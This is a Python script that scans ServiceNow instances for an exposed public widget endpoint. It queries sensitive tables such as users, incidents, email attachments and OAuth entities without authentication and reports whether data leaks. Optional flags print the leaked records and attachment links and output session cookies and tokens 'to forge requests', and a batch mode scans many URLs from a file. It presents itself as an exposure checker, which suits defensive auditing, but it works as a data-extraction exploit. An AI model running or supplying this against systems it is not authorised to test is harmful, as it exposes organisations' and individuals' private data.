#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import requests
import json
import re
import getpass

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def check_vulnerability(url, g_ck_value, cookies, s, proxies, fast_check, display, tables):
    table_list = [
        "t=cmdb_model&f=name",
        "t=cmn_department&f=app_name",
        "t=kb_knowledge&f=text",
        "t=licensable_app&f=app_name",
        "t=alm_asset&f=display_name",
        "t=sys_attachment&f=file_name",
        "t=sys_attachment_doc&f=data",
        "t=oauth_entity&f=name",
        "t=cmn_cost_center&f=name",
        "t=cmdb_model&f=name",
        "t=sc_cat_item&f=name",
        "t=sn_admin_center_application&f-name",
        "t=cmn_company&f=name",
        "t=customer_account&f=name",
        "t=sys_email_attachment&f=email",
        "t=sys_email_attachment&f=attachment",
        "t=cmn_notif_device&f=email_address",
        "t=sys_portal_age&f=display_name",
        "t=incident&f=short_description",
        "t=work_order&f=number",
        "t=incident&f=number",
        "t=sn_customerservice_case&f=number",
        "t=task&f=number",
        "t=customer_project&f=number",
        "t=customer_project_task&f=number",
        "t=sys_user&f=name",
        "t=customer_contact&f=name"
    ]
    if tables is not None:
        table_list = tables

    if fast_check:
        table_list = ["t=kb_knowledge"]

    vulnerable_urls = []

    for table in table_list:
        headers = {
            'Cookie': '; '.join([f'{k}={v}' for k, v in cookies.items()]),
            'X-UserToken': g_ck_value,
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Connection': 'close'
        }
        if g_ck_value is None:
            del headers['X-UserToken']

        post_url = f"{url}/api/now/sp/widget/widget-simple-list?{table}"
        data_payload = json.dumps({})  # Empty JSON payload

        post_response = s.post(post_url, headers=headers, data=data_payload, verify=False, proxies=proxies)

        if post_response.status_code == 200 or post_response.status_code == 201:
            response_json = post_response.json()
            if 'result' in response_json and response_json['result']:
                if 'data' in response_json['result']:
                    if 'count' in response_json['result']['data'] and response_json['result']['data']['count'] > 0:
                        if response_json['result']['data']['list'] and len(response_json['result']['data']['list']) > 0:
                            if any(d['display_field']['display_value'] is not None for d in response_json['result']['data']['list']):
                                print(f"{post_url} is EXPOSED, and REALLY LEAKING data. Check ACLs ASAP.")
                            else:
                                print(f"{post_url} is EXPOSED, and POTENTIALLY LEAKING data. Check ACLs ASAP.")
                            if display:
                                try:
                                    items = response_json['result']['data']['list']
                                    for item in items:
                                        display_value = item['display_field']['display_value']
                                        sys_id = item['sys_id']                                        
                                        if "sys_attachment" in table:
                                            print(f'{url}/sys_attachment.do?sys_id={sys_id}#{display_value}')
                                        else:
                                            print(f'{display_value}')
                                    print("")
                                except:
                                    print('failed to extract display data')
                        else:
                            print(f"{post_url} is EXPOSED, but data is NOT leaking likely because ACLs are blocking. Mark Widgets as not Public.")
                        vulnerable_urls.append(post_url)

    return vulnerable_urls


def check_url_get_headers(url, proxies, username, password):
    # get the session
    url = url.strip()
    url = url.rstrip('/')

    s = requests.Session()
    if username is not None:
        login_url = f"{url}/login.do"
        payload = {
            'user_name': username,
            'user_password': password,
            'sys_action': 'sysverb_login'
        }
        s.post(login_url, payload, proxies=proxies)
    response = s.get(url, verify=False, proxies=proxies)
    cookies = s.cookies.get_dict()

    g_ck_value = None
    if response.text:
        match = re.search(r"var g_ck = '([a-zA-Z0-9]+)'", response.text)
        if match:
            g_ck_value = match.group(1)
            return g_ck_value, cookies, s

    if not g_ck_value:
        return None, cookies, s


def main(url, fast_check, proxy, display, headers, tables, username, password):
    if proxy:
        proxies = {'http': proxy, 'https': proxy}
    else:
        proxies = None

    url = url.strip()
    url = url.rstrip('/')
    g_ck_value, cookies, s = check_url_get_headers(url, proxies, username, password)
    if g_ck_value is None:
        print(f"{url} has no g_ck. Continuing test without X-UserToken header")

    vulnerable_url = check_vulnerability(url, g_ck_value, cookies, s, proxies, fast_check, display, tables)
    if vulnerable_url and headers :
        print("Headers to forge requests:")
        if g_ck_value is not None:
            print(f"X-UserToken: {g_ck_value}")
        print(f"Cookie: {'; '.join([f'{k}={v}' for k, v in cookies.items()])}\n")

    return bool(vulnerable_url)


if __name__ == '__main__':
    any_vulnerable = False  # Track if any URLs are vulnerable

    parser = argparse.ArgumentParser(description='Fetch g_ck and cookies from a given URL')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--url', help='The URL to fetch from')
    group.add_argument('--file', help='File of URLs')
    parser.add_argument('--fast-check', action='store_true', help='Only check for the table incident')
    parser.add_argument('--proxy', help='Proxy server in the format http://host:port', default=None)
    parser.add_argument('--display', action='store_true', help='output display name for quick visual')
    parser.add_argument('--headers', action='store_true', help='print headers to forge request with any vulnerable systems')
    parser.add_argument('--table-file', help='The specific tables to test')
    parser.add_argument('--username', help='The username to login with')
    parser.add_argument('--password', help='The password to login with')
    args = parser.parse_args()
    fast_check = args.fast_check
    display = args.display
    proxy = args.proxy
    headers = args.headers
    table_file = args.table_file
    username = args.username
    password = args.password

    # Prompt for a password if required
    if username is not None and password is None:
        password = getpass.getpass("Enter password: ")

    # Collect tables to test from file if required
    tables = None
    if table_file is not None:
        try:
            table_file = args.table_file
            with open(table_file, 'r') as file:
                tables = file.read().splitlines()
        except FileNotFoundError:
            print(f"Could not find {url_file}")
        except Exception as e:
            print(f"Error occurred: {e}")

    if args.url:
        any_vulnerable = main(args.url, fast_check, proxy, display, headers, tables, username, password)
    else:
        try:
            url_file = args.file
            with open(url_file, 'r') as file:
                url_list = file.readlines()
            for url in url_list:
                if main(url, fast_check, proxy, display, headers, tables, username, password):
                    any_vulnerable = True  # At least one URL was vulnerable
        except FileNotFoundError:
            print(f"Could not find {url_file}")
        except Exception as e:
            print(f"Error occurred: {e}")

    if not any_vulnerable:
        print("Scanning completed. No vulnerable URLs found.")
